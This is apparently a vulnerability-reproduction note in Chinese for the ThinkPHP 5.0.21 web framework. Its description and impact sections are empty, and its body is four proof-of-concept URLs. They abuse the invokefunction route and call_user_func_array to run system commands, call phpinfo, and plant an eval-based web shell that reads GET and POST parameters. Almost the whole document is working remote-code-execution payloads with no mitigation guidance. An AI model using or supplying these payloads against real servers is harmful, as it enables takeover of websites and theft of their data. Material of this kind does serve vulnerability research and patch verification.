Thinkphp 5.0.21
===============

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 1、poc

    http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

### 2、poc

    http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

### 3、poc

    http://0-sec.org/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=system("whoami");

### 4、poc

    http://0-sec.org/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=eval($_POST[ian])
